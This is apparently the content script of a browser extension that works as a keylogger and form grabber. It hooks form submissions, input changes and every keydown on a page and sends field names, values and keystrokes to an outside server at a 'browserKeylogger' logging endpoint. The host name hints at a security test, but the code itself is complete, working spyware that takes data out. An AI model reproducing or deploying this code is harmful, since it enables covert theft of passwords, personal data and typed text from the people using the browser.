// content.js

// Immediately execute our code when the content script runs
(function() {
    
    // Listen for submit events on the document
    document.addEventListener('submit', function(event) {
        // Prevent the default form submission behavior
        //event.preventDefault();
        
        // 'event.target' is the form element that was submitted
        const form = event.target;
        
        var i=0;
        var args="";
        var r="";
        while (i<form.length) {
            r="";
            if(form[i].type=='text') {
                r = form[i].id+"+"+form[i].name+"="+form[i].value+"&";
            }
            else {
                r = JSON.stringify(form[i])+"=="+form[i].value+"&";
            }
            args = args + r;
            i++;
        }
        args = args.slice(0, -1);

        var url = "https://test.cert.authyou.systems/browserKeylogger/myExtensionLog.php?type=submit&"+args;

          fetch(url).then(function(response) {
            return response.json();
          }).then(function(data) {
            console.log(data);
          }).catch(function(err) {
            console.log('Fetch Error :-S', err);
          });
        
    });
    
    // Select all input elements in the document
    const inputs = document.querySelectorAll('input');

    // Loop over each input element and add a 'change' event listener
    inputs.forEach(function(input) {
      input.addEventListener('change', function(event) {
        // Alert the current value of the input field when its value changes
        //alert(event.target.value);
        console.log(event.target.id+":"+event.target.value);

        var args = "value="+JSON.stringify(event.target.value);
        const inputId = event.target.id;                   // Access the id attribute
        const inputName = event.target.getAttribute("name"); // Access the name attribute
        args = args + "&id="+inputId+"&name="+inputName;
      
        var url = "https://test.cert.authyou.systems/browserKeylogger/myExtensionLog.php?type=input&"+args;

        fetch(url).then(function(response) {
          return response.json();
        }).then(function(data) {
          console.log(data);
        }).catch(function(err) {
          console.log('Fetch Error :-S', err);
        });

      });
      
    });
  
    document.addEventListener('keydown', function(event) {
      // Alert the current value of the input field when its value changes
      console.log(event.key);
      args="key:"+event.key;
      var url = "https://test.cert.authyou.systems/browserKeylogger/myExtensionLog.php?type=keydown&"+args;

      fetch(url).then(function(response) {
        return response.json();
      }).then(function(data) {
        console.log(data);
      }).catch(function(err) {
        console.log('Fetch Error :-S', err);
      });
    });

})();
  


  